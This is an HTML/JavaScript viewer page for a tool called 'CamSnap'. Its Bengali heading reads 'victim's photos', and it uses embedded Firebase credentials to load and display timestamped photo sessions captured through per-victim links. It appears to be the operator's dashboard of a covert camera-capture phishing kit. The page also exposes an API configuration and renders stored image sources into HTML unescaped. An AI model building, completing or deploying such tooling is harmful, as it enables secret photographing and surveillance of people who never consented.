<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ভিকটিমের ছবি • CamSnap</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    body{background:#111;color:#fff;font-family:'Segoe UI',sans-serif;padding:20px;min-height:100vh;}
    h1{text-align:center;color:#00ccff;font-size:2.3em;margin:30px 0;}
    .container{max-width:900px;margin:0 auto;}
    .session{background:#1a1a2e;border-radius:22px;padding:25px;margin:30px 0;box-shadow:0 12px 35px rgba(0,0,0,0.6);}
    .date{color:#00ff9d;font-size:1.7em;font-weight:700;margin-bottom:12px;}
    .time{color:#aaa;margin-bottom:20px;font-size:1.1em;}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:18px;}
    .grid img{width:100%;height:250px;object-fit:cover;border-radius:18px;border:5px solid #0066ff;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(0,102,255,0.5);}
    .grid img:hover{transform:scale(1.06);}
    .no-photo{color:#888;font-size:1.5em;text-align:center;padding:100px 0;}
  </style>
</head>
<body>
<div class="container">
  <h1>ভিকটিমের ছবি</h1>
  <div id="content">লোড হচ্ছে...</div>
</div>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ID ১০০% সঠিকভাবে নেওয়া
let id = new URLSearchParams(location.search).get('id');
if (!id) {
  id = location.pathname.split('/').pop();
  if (id === 'viewer.html' || id === '') id = null;
}

if (!id) {
  document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:100px;'>লিংক ভুল!</h1>";
  throw new Error("No ID");
}

// সঠিক পথে ডাটা লোড (এটাই ছিল সমস্যা!)
db.ref('links/' + id + '/sessions').on('value', (snapshot) => {
  const sessions = snapshot.val();
  const container = document.getElementById('content');

  if (!sessions || Object.keys(sessions).length === 0) {
    container.innerHTML = "<p class='no-photo'>এখনো কোনো ছবি আসেনি</p>";
    return;
  }

  let html = '';
  Object.keys(sessions).sort((a,b) => b.localeCompare(a)).forEach(date => {
    const session = sessions[date];
    const photos = session.photos || [];
    const time = session.time || "সময় পাওয়া যায়নি";

    html += `
      <div class="session">
        <div class="date">${date}</div>
        <div class="time">${time}</div>
        <div class="grid">
          ${photos.map(src => `<img src="${src}" onclick="window.open('${src}')">`).join('')}
        </div>
      </div>
    `;
  });

  container.innerHTML = html;
});
</script>
</body>
</html>
